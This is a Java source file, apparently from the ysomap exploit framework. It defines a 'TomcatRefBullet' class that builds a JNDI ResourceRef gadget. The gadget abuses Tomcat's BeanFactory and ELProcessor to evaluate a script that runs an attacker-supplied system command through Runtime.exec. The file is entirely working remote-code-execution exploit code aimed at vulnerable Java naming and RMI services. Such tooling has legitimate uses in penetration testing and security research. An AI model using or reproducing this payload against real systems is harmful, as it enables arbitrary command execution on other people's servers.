package ysomap.core.bullet.jdk.rmi;

import org.apache.naming.ResourceRef;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Bullets
@Dependencies({"org.apache.tomcat:tomcat-catalina:xxx"})
@Authors({ Authors.WH1T3P1G })
public class TomcatRefBullet extends Bullet<Reference> {

    @Require(name = "command", detail = "system command to execute")
    private String command;

    @Override
    public Reference getObject() throws Exception {
        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null, "", "",
                true,"org.apache.naming.factory.BeanFactory",
                null);
        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
        ref.add(new StringRefAddr("KINGX",
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                        ".newInstance().getEngineByName(\"JavaScript\")" +
                        ".eval(\"java.lang.Runtime.getRuntime().exec('"+command+"')\")"));
        return ref;
    }
}
